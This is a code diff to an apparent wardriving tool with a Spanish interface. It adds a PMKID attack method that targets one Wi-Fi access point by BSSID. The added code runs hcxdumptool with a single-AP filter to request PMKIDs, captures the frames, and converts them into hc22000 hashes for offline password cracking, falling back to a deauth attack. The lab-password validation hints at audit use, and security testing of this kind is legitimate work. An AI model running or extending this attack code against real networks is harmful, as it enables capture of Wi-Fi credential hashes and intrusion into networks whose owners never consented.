@@ -7,6 +7,7 @@ import { detectMonitorAdapter } from "../wifiradar/adapter";
 import { enterMonitorMode, exitMonitorMode } from "./monitor";
 import { setChannel } from "./rf";
 import { AirodumpCapture, DeauthRunner, scanTarget } from "./attack";
+import { PmkidDriveRunner } from "../wardrive/attack";
 import { WardriveSession, SESSIONS_ROOT } from "./session";
 import { discoverTargets } from "./discovery";
 import {
@@ -678,7 +679,7 @@ export class WardriveService extends EventEmitter {
 
   // ─── Attacks ────────────────────────────────────────────────────────────
 
-  async attackOne(bssidRaw: string): Promise<{ ok: boolean; error?: string }> {
+  async attackOne(bssidRaw: string, method?: string): Promise<{ ok: boolean; error?: string }> {
     const bssid = WardriveService.clean(bssidRaw);
     if (!bssid) return { ok: false, error: "BSSID inválido" };
     if (this.mode === "attacking") return { ok: false, error: "Ya hay un ataque en curso" };
@@ -697,6 +698,8 @@ export class WardriveService extends EventEmitter {
     this.broadcastStatus();
     if (this.source === "demo") {
       await this.runTargetDemo(bssid, target.ssid, target.channel);
+    } else if (method === "pmkid") {
+      await this.runTargetPmkid(bssid, target.ssid, target.channel);
     } else {
       await this.runTarget(bssid, target.ssid, target.channel);
     }
@@ -812,9 +815,98 @@ export class WardriveService extends EventEmitter {
     this.session?.addProgress(bssid, step, message, command, output);
   }
 
-  // Full attack cycle against one BSSID: PMKID first (silent, no client
-  // needed), then directed deauth bursts with settle windows. First method
-  // to produce EAPOL/PMKID wins; everything lands in the session folder.
+  // Explicit PMKID attack (the "PMKID" button): hcxdumptool pointed at the
+  // target with a single-AP BPF asks for the RSN IE PMKID directly — no
+  // deauth, no clients needed. The capture lands in the same session
+  // folder (per-BSSID .pcapng + .hc22000) and autoValidates like the
+  // deauth path when WARDRIVE_LAB_PASSWORD is set.
+  private async runTargetPmkid(bssid: string, ssid: string, channel: number): Promise<void> {
+    if (!this.session || !this.iface) return;
+    if (this.attackAbort) {
+      this.updateMeta(bssid, { status: "cancelled" });
+      return;
+    }
+    this.updateMeta(bssid, { ssid, channel, status: "running", method: "pmkid", error: "" });
+
+    const prefix = path.join(this.session.dir, bssid.replace(/:/g, "").toLowerCase());
+    const pcapngPath = `${prefix}-pmkid.pcapng`;
+    const bpfFile = `${pcapngPath}.bpf`;
+    try {
+      fs.rmSync(pcapngPath, { force: true });
+    } catch { /* not there */ }
+    const hashPath = `${prefix}-pmkid.hc22000`;
+
+    // Compile the single-AP BPF (hcxdumptool's own --bpfc).
+    const bpfPath = await this.writeBpfForAp(bssid, bpfFile);
+    if (!bpfPath) {
+      this.progress(bssid, "scan", "No se pudo compilar el BPF del objetivo");
+      this.updateMeta(bssid, { status: "failed", error: "BPF compile failed" });
+      return;
+    }
+
+    this.progress(bssid, "scan", `Ataque PMKID → ${ssid || bssid} (canal ${channel})...`,
+      `hcxdumptool -i ${this.iface} -c ${channel}a --bpf ${bpfFile} --exitoneapol 3`);
+
+    // The attack window: 60s of directed PMKID requests. The runner writes
+    // a full-channel dumpcap in parallel (rt2800usb loses hcx -w frames);
+    // hcxdumptool exits on the first EAPOL (bitmask 3 = PMKID/M2M3).
+    const runner = new PmkidDriveRunner(this.iface, bssid, pcapngPath, channel || 1, 60_000, bpfFile);
+    this.captureRunner = null; // (a different class — this slot stays free)
+    this.pmkidAttackRunner = runner;
+    runner.on("hit", () => {
+      this.progress(bssid, "validate", "¡PMKID recibido! Cerrando captura...");
+    });
+    const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+    runner.start();
+    await Promise.race([exited, sleep(68_000)]);
+    runner.stop();
+    this.pmkidAttackRunner = null;
+    if (this.attackAbort) {
+      this.updateMeta(bssid, { status: "cancelled" });
+      return;
+    }
+
+    // Validate: the full-channel dumpcap may hold the AP's frames mixed
+    // with others — narrow with tshark, convert with --all.
+    const conv = await this.session.convertCapture(pcapngPath);
+    if (conv.hasCapture) {
+      this.markCaptured(bssid, "pmkid", pcapngPath);
+      this.progress(bssid, "done", "PMKID capturado correctamente", undefined, hashPath);
+      await this.autoValidate(bssid);
+      return;
+    }
+    const { extractApFrames, convertCaptureToHash } = await import("../wardrive/attack");
+    const ex = await extractApFrames(bssid, pcapngPath, `${pcapngPath}.narrow.pcapng`);
+    if (ex.ok) {
+      const conv2 = await convertCaptureToHash(`${pcapngPath}.narrow.pcapng`, hashPath);
+      if (conv2.ok) {
+        this.markCaptured(bssid, "pmkid", `${pcapngPath}.narrow.pcapng`);
+        this.progress(bssid, "done", "PMKID capturado correctamente", undefined, hashPath);
+        await this.autoValidate(bssid);
+        return;
+      }
+    }
+    this.progress(bssid, "done", "El AP no respondió al PMKID request (usa el botón Deauth o Auditar)");
+    this.updateMeta(bssid, {
+      status: "failed",
+      error: "PMKID sin respuesta — prueba Deauth (requiere clientes) o Auditar (ambos métodos)",
+    });
+  }
+
+  private pmkidAttackRunner: import("../wardrive/attack").PmkidDriveRunner | null = null;
+
+  private async writeBpfForAp(bssid: string, bpfFile: string): Promise<string | null> {
+    const { compileBpfForAp } = await import("../wardrive/attack");
+    const bpf = await compileBpfForAp(bssid);
+    if (!bpf) return null;
+    try {
+      fs.writeFileSync(bpfFile, bpf + "\n");
+      return bpfFile;
+    } catch {
+      return null;
+    }
+  }
+
   // Full attack cycle against one BSSID, airodump + aireplay style:
   //   1. lock the radio to the target channel
   //   2. start airodump-ng capturing (rolling .cap, runs the whole cycle so a
@@ -1423,6 +1515,8 @@ export class WardriveService extends EventEmitter {
   private stopRunners(): void {
     this.captureRunner?.stop();
     this.captureRunner = null;
+    this.pmkidAttackRunner?.stop();
+    this.pmkidAttackRunner = null;
     this.deauthRunner?.stop();
     this.deauthRunner = null;
     for (const [, runner] of this.deauthRunnerByMac) {
